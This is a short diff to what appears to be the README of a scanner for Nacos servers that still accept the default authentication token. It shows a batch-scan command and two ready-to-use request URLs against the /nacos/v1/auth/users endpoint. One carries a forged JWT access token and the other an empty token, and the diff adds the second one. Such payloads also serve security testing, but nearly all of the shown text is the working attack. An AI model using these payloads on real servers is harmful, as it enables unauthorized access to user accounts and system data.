@@ -12,7 +12,7 @@ python3 Nacos_default.token.py -f url.txt 批量检测
 
 payload1:http://xxx.com/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
 
-payload2:
+payload2:http://xxx.com/nacos/v1/auth/users?accessToken=&pageNo=1&pageSize=9
 
 
 扫描结束后会在当前目录生成存在漏洞url的vuln.txt
